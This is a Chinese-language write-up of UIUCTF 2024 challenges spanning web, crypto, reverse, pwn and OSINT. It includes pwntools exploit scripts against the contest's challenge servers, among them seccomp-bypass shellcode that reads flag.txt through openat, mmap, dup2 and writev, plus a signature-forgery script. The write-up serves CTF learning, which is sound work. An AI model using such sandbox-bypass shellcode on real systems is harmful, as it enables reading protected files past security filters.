# UIUCTF 2024
###### tags: `CTF`

## Web
### Fare Evasion

按下 pay 會噴出訊息，包含了一個 secret key `a_boring_passenger_signing_key_?`

![img](https://i.imgur.com/Ges0sY4.png)

丟 jwt 驗證通過，應該是要自己簽 jwt

![image](https://i.imgur.com/KfhRBwj.png)

嘗試改成 kid: `conductor_key` 和 type: `conductor` 皆無法正常使用 <- 目前的進度

目前確認訊息顯示的 `hashed` 是 `md5(passenger_key)`


看回應大概可以猜出要拿到 conductor_key 接下來就通靈測試
多試幾次可以發現發現 kid 對特殊的值有反應 false, co, %FA 之類的
猜可能是特殊的 sql injecttion 
ref: https://github.com/gen0cide/hasherbasher
```json
{"message":"Sorry passenger, only conductors are allowed right now. Please sign your own tickets. \nhashed \u00f4\u008c\u00f7u\u009e\u00deIB\u0090\u0005\u0084\u009fB\u00e7\u00d9+ secret: conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e\nhashed _\bR\u00f2\u001es\u00dcx\u00c9\u00c4\u0002\u00c5\u00b4\u0012\\\u00e4 secret: a_boring_passenger_signing_key_?","success":false}
```
flag: `uiuctf{sigpwny_does_not_condone_turnstile_hopping!}`


## Crypto
### X Marked the Spot
頭尾 XOR 就有了
```python
from pwn import xor
from itertools import cycle

ct_file_path = 'ct'

with open(ct_file_path, 'rb') as file:
    ct = file.read()

known_part = b"uiuctf{}"
known_ct = ct[:7]+ct[-1:]
key_part = bytes([kp ^ kc for kp, kc in zip(known_part, known_ct)])
full_key = key_part * (len(ct) // len(key_part)) + key_part[:len(ct) % len(key_part)]
decrypted_flag = bytes([c ^ k for c, k in zip(ct, cycle(full_key))])
print("flag: ", decrypted_flag.decode())

```
key:  b'hdiqbfjq'
flag:  `uiuctf{n0t_ju5t_th3_st4rt_but_4l50_th3_3nd!!!!!}`

### Without a Trace

題目會把 flag 拆成 5 段，並會放進單位矩陣的對角線上

我們可以輸入另一個單位矩陣的對角線上的值

題目會把兩個矩陣做相乘，並算 [trace](https://numpy.org/doc/stable/reference/generated/numpy.trace.html)，也就是將對角的元素加起來給我們

因此可以把題目列成下面的方程式

$y = f_0 * i_0 + f_1 * i_1 + f_2 * i_2 + f_3 * i_3 + f_4 * i_4$

而一個簡單的想法是利用 n 進位的計算，這樣就可以求出 $f_0$ ~ $f_4$ 的值，而由於 5 bytes 的大小是 $256^5 = 1099511627776$，因此在輸入部分會分別給 $1099511627776^4$ ~ $1099511627776^0$，而後取得方程式結果 $y$ 之後再不斷進行模除和整數除法即可

![image](https://i.imgur.com/Us3l1nT.png)
![image](https://i.imgur.com/3xQ5fd3.png)

`uiuctf{tr4c1ng_&&_mult5!}`

### Determined

題目會要求我們輸入並產生這樣的矩陣，數字圈圈是我們可以輸入的部分，p, q 是 RSA 的參數

$$
\begin{bmatrix}
p & 0 & ① & 0 & ② \\
0 & ③ & 0 & ④ & 0 \\
⑤ & 0 & ⑥ & 0 & ⑦ \\
0 & q & 0 & r & 0 \\
⑧ & 0 & ⑨ & 0 & 0 \\
\end{bmatrix}
$$

而題目會計算這個矩陣的 determinent，而經過一系列計算可以得到下面的方程式

$y = (⑦⑨p - ②⑤⑨ + ⑧(②⑥ - ①⑦)) \times (③r - ④q)$

而由於我們要取得 p, q 而已，因此可以稍微調整參數簡化方程式，比如說可以調整 $② = 0$, $⑧ = 0$, $⑦ = 1$, $⑨ = 1$，方程式可以簡化成下面

$y = p \times (③r - ④q)$

再調整 $③ = 1$ 和 $④ = 0$，可以得到 $y = p \times r$，拿去與 n 做 GCD 即可取得 p 的值，後續再求出 q, $\phi{(n)}$ 就可以取得密鑰 q，進而進行解密

> 註: 這邊也可以直接限制 $④ = -1$ 其他是 0，就可以直接取得 q 的值出來，但我是後來才想到的

![image](https://i.imgur.com/jVNAsEk.png)
![image](https://i.imgur.com/VirhLQN.png)

`uiuctf{h4rd_w0rk_&&_d3t3rm1n4t10n}`

### Naptime

題目的加密部分如下

:::spoiler `enc_dict.sage`
```python
def enc(flag, a, n):
    bitstrings = []
    for c in flag:
        # c -> int -> 8-bit binary string
        bitstrings.append(bin(ord(c))[2:].zfill(8))
    ct = []
    for bits in bitstrings:
        curr = 0
        for i, b in enumerate(bits):
            if b == "1":
                curr += a[i]
        ct.append(curr)

    return ct
```
:::

可以得知他會將每個字元轉換成 bit，並會根據每個 bit 是否為 1 去取得 array `a` 的值並做加總

因此我們可以先建一個表，將 array `a` 的所有組合都先找出來，之後查這個表就可以知道當前位置的字元是哪個，就能拚出完整的 flag

:::spoiler `solve.py`
```python
a = ...
ct = ...

# build code -> ascii mapping
mapping = {}
for num in range(256):
    mapping[sum(a[i] for i,j in enumerate(bin(num)[2:].zfill(8)) if (j == '1'))] = chr(num)

flag = b""
for c in ct:
    flag += mapping[c].encode()
print(flag)
```
:::

`uiuctf{i_g0t_sleepy_s0_I_13f7_th3_fl4g}`

### Snore Signatures

題目如下

:::spoiler `solve.py`
```python
#!/usr/bin/env python3

from Crypto.Util.number import isPrime, getPrime, long_to_bytes, bytes_to_long
from Crypto.Random.random import getrandbits, randint
from Crypto.Hash import SHA512

LOOP_LIMIT = 2000


def hash(val, bits=1024):
    output = 0
    for i in range((bits//512) + 1):
        h = SHA512.new()
        h.update(long_to_bytes(val) + long_to_bytes(i))
        output = int(h.hexdigest(), 16) << (512 * i) ^ output
    return output


def gen_snore_group(N=512):
    q = getPrime(N)
    for _ in range(LOOP_LIMIT):
        X = getrandbits(2*N)
        p = X - X % (2 * q) + 1
        if isPrime(p):
            break
    else:
        raise Exception("Failed to generate group")

    r = (p - 1) // q

    for _ in range(LOOP_LIMIT):
        h = randint(2, p - 1)
        if pow(h, r, p) != 1:
            break
    else:
        raise Exception("Failed to generate group")

    g = pow(h, r, p)

    return (p, q, g)


def snore_gen(p, q, g, N=512):
    x = randint(1, q - 1)
    y = pow(g, -x, p)
    return (x, y)


def snore_sign(p, q, g, x, m):
    k = randint(1, q - 1)
    r = pow(g, k, p)
    e = hash((r + m) % p) % q
    s = (k + x * e) % q
    return (s, e)


def snore_verify(p, q, g, y, m, s, e):
    if not (0 < s < q):
        return False

    rv = (pow(g, s, p) * pow(y, e, p)) % p
    ev = hash((rv + m) % p) % q

    return ev == e


def main():
    p, q, g = gen_snore_group()
    print(f"p = {p}")
    print(f"q = {q}")
    print(f"g = {g}")

    queries = []
    for _ in range(10):
        x, y = snore_gen(p, q, g)
        print(f"y = {y}")

        print('you get one query to the oracle')

        m = int(input("m = "))
        queries.append(m)
        s, e = snore_sign(p, q, g, x, m)
        print(f"s = {s}")
        print(f"e = {e}")

        print('can you forge a signature?')
        m = int(input("m = "))
        s = int(input("s = "))
        # you can't change e >:)
        if m in queries:
            print('nope')
            return
        if not snore_verify(p, q, g, y, m, s, e):
            print('invalid signature!')
            return
        queries.append(m)
        print('correct signature!')

    print('you win!')
    print(open('flag.txt').read())

if __name__ == "__main__":
    main()
```
:::

他是一個簽章演算法，而其中主要有問題的是在 sign 的部分，他將 $g^k \mod{p}$ 的部分直接與 m 相加後取 $\mod{p}$ 去計算 hash

:::spoiler
```python
def snore_sign(p, q, g, x, m):
    k = randint(1, q - 1)
    r = pow(g, k, p)
    e = hash((r + m) % p) % q
    s = (k + x * e) % q
    return (s, e)
```
:::

而由於在有限群 $p$ 中，$i$ 與 $i+p$ 的值會是一樣的，而理所當然的這邊第一次做與第二次做 hash 的輸入部分就會是相同的，所以會產生相同的 signature，但是在外面檢查時看到的值是在整數群下因此不相同，因此不會被檢查到

完整的 exploit 如下

:::spoiler `solve.py`
```python
from pwn import *
context.log_level = "debug"

conn = remote("snore-signatures.chal.uiuc.tf", 1337, ssl=True)
# conn = process(["python3", "chal.py"])

p = int(conn.recvline().strip().split(b" = ")[1])
q = int(conn.recvline().strip().split(b" = ")[1])
g = int(conn.recvline().strip().split(b" = ")[1])

for i in range(10):
    y = int(conn.recvline().strip().split(b" = ")[1])
    conn.sendlineafter(b"m = ", str(i).encode())
    s = int(conn.recvline().strip().split(b" = ")[1])
    e = int(conn.recvline().strip().split(b" = ")[1])

    new_m = i+p
    new_s = s
    conn.sendlineafter(b"m = ", str(new_m).encode())
    conn.sendlineafter(b"s = ", str(new_s).encode())
    result = conn.recvline()
    if result != b"correct signature!\n":
        print(result)
        break
conn.interactive()
```
:::

`uiuctf{add1ti0n_i5_n0t_c0nc4t3n4ti0n}`

## Reverse
### Summarize

題目要我們找六個數字滿足條件，flag 是這六個數字的 hex 組合

![image](https://i.imgur.com/Y8IL7qd.png)

條件式如下

![image](https://i.imgur.com/x0aGIh2.png)

函式中的 `minus`, `add` 等是透過觀察和使用 Copilot 整理的，原始的長相如下，基本上就是一個 bit 一個 bit 做處理的步驟

![image](https://i.imgur.com/4tZmAbe.png)

而求解部分就交給 z3 處理

:::spoiler `solve.py`
```python
import z3
nums = [z3.BitVec(f'n{i}',32) for i in range(6)]

def sub_40163D(a1, a2):
    return a1 + a2
def sub_4016D8(a1, a2):
    return a1 - a2
def sub_4016FE(a1, a2):
    return a1 * a2
def sub_40174A(a1, a2):
    return a1 ^ a2
def sub_4017A9(a1, a2):
    return a1 & a2

s = z3.Solver()
for num in nums:
    s.add(num > 100000000, num <= 999999999)

a, b, c, d, e, f = nums
v7 = sub_4016D8(a, b)
v18 = sub_40163D(v7, c) % 0x10AE961
v19 = sub_40163D(a, b) % 0x1093A1D
v8 = sub_4016FE(2, b)
v9 = sub_4016FE(3, a)
v10 = sub_4016D8(v9, v8)
v20 = v10 % sub_40174A(a, d)
v11 = sub_40163D(c, a)
v21 = sub_4017A9(b, v11) % 0x6E22
v22 = sub_40163D(b, d) % a
v12 = sub_40163D(d, f)
v23 = sub_40174A(c, v12) % 0x1CE628
v24 = sub_4016D8(e, f) % 0x1172502
v25 = sub_40163D(e, f) % 0x2E16F83

s.add(v18 == 4139449)
s.add(v19 == 9166034)
s.add(v20 == 556569677)
s.add(v21 == 12734)
s.add(v22 == 540591164)
s.add(v23 == 1279714)
s.add(v24 == 17026895)
s.add(v25 == 23769303)

if s.check() == z3.sat:
    model = s.model()
    # get the values of the variables
    for num in nums:
        print(hex(model[num].as_long()))
else:
    print("unsat")
```
:::

![image](https://i.imgur.com/7YJLGiz.png)

`uiuctf{2a142dd72e87fa9c1456a32d1bc4f77739975e5fcf5c6c0}`

## Pwn
### syscalls

基本上就是可以寫 shellcode，但是裡面有用 prctl 設定 seccomp

另外可以知道的一點是 flag 在當前目錄的 `flag.txt` 裡面

使用 [seccomp-tools](https://github.com/david942j/seccomp-tools) dump 出的 seccomp rule 如下

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x16 0xc000003e  if (A != ARCH_X86_64) goto 0024
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x13 0xffffffff  if (A != 0xffffffff) goto 0024
 0005: 0x15 0x12 0x00 0x00000000  if (A == read) goto 0024
 0006: 0x15 0x11 0x00 0x00000001  if (A == write) goto 0024
 0007: 0x15 0x10 0x00 0x00000002  if (A == open) goto 0024
 0008: 0x15 0x0f 0x00 0x00000011  if (A == pread64) goto 0024
 0009: 0x15 0x0e 0x00 0x00000013  if (A == readv) goto 0024
 0010: 0x15 0x0d 0x00 0x00000028  if (A == sendfile) goto 0024
 0011: 0x15 0x0c 0x00 0x00000039  if (A == fork) goto 0024
 0012: 0x15 0x0b 0x00 0x0000003b  if (A == execve) goto 0024
 0013: 0x15 0x0a 0x00 0x00000113  if (A == splice) goto 0024
 0014: 0x15 0x09 0x00 0x00000127  if (A == preadv) goto 0024
 0015: 0x15 0x08 0x00 0x00000128  if (A == pwritev) goto 0024
 0016: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0024
 0017: 0x15 0x00 0x05 0x00000014  if (A != writev) goto 0023
 0018: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # writev(fd, vec, vlen)
 0019: 0x25 0x03 0x00 0x00000000  if (A > 0x0) goto 0023
 0020: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0024
 0021: 0x20 0x00 0x00 0x00000010  A = fd # writev(fd, vec, vlen)
 0022: 0x25 0x00 0x01 0x000003e8  if (A <= 0x3e8) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL
```

沒法直接用 execve，也沒法用 open + read + write，但是沒有擋掉像是 `openat`，此外在 `writev` 的部分似乎也可以正常運行，比較麻煩的是如何讀檔案

這邊我想到的方法是使用 mmap 的 backed file 功能，他會將檔案直接 map 進 process meory，如此一來就能代替 read 的功能

而在 `writev` 的部分可以看到有限制讀取的 fd 需要大於 1000，而這邊可以使用 `dup2` 複製 stdout 到一個我們想要的 fd (如 1001) 上

以下是完整的 exploit

:::spoiler `solve.py`
```python
from pwn import *
binary = "./syscalls"

context.terminal = ["cmd.exe", "/c", "start", "bash.exe", "-c"]
context.log_level = "debug"
context.binary = binary

conn = remote("syscalls.chal.uiuc.tf", 1337, ssl=True)
# conn = process(binary)
# conn = gdb.debug(binary)

flagfile = b"flag.txt"
SYSCALL_OPENAT = 0x101
SYSCALL_MMAP = 0x9
SYSCALL_WRITEV = 0x14
SYSCALL_DUP2 = 0x21
AT_FDCWD = -100
# openat(-100, flagfile, 0, 0) + 
# mmap(0, 0x100, 0x7, 0x2, rax, 0) +
# create struct iovec on stack
    # struct iovec {
    #    void      *iov_base;      /* starting address of buffer */
    #    size_t    iov_len;        /* size of buffer */
    # };
# dup2(1, 1000) +
# writev(1000, rsp, 1)
shellcode = asm(f"""
push 0x0
mov rbx, 0x{flagfile[::-1].hex()}
push rbx
mov rax, {hex(SYSCALL_OPENAT)}
mov rdi, {AT_FDCWD}
mov rsi, rsp
xor rdx, rdx
xor r10, r10
syscall

mov r8, rax
mov rax, {hex(SYSCALL_MMAP)}
xor rdi, rdi
mov rsi, 0x100
mov rdx, 0x7
mov r10, 0x2
xor r9, r9
syscall

push 0x100
push rax

mov rax, {hex(SYSCALL_DUP2)}
mov rdi, 0x1
mov rsi, 1001
syscall

mov rax, {hex(SYSCALL_WRITEV)}
mov rdi, 1001
mov rsi, rsp
mov rdx, 0x1
syscall
""")

conn.sendlineafter("you.\n", shellcode)
conn.interactive()
```
:::

`uiuctf{a532aaf9aaed1fa5906de364a1162e0833c57a0246ab9ffc}`

## OSINT
### Hip With the Youth
https://www.threads.net/@longislandsubwayauthority/post/C8tBD_eRl9Z?xmt=AQGzetMM2HApb_vk6RGxR2Ii0u8szZtwQ9yd47lN5nnlLAM
![image](https://i.imgur.com/37HQwPA.png)
`uiuctf{7W1773r_K!113r_321879}`

### An Unlikely Partnership
https://www.linkedin.com/in/uiuc-chan/
![image](https://i.imgur.com/h8QfV2k.png)
`uiuctf{0M160D_U1UCCH4N_15_MY_F4V0r173_129301}`

### Night

找到[位置](https://maps.app.goo.gl/qr6zGGh4mHYTT4mUA)

稍微測試一下周圍的路，找到拍攝角度可能是後面一點的橋的地方

`uiuctf{Arlington Street, Boston}`